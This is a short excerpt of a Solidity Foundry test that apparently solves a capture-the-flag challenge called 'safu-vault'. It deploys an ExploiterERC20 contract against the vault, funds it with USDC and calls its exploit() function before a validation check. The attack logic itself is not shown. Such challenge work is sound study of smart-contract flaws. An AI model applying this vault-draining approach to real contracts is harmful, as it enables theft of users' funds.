...
import {ExploiterERC20} from "src/safu-vault/ExploiterERC20.sol";
...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        ExploiterERC20 fakeErc20 = new ExploiterERC20(address(usdc), address(safuVault));
        usdc.transfer(address(fakeErc20), 10_000e18);
        fakeErc20.exploit();
        vm.stopPrank();
        validation();
    }
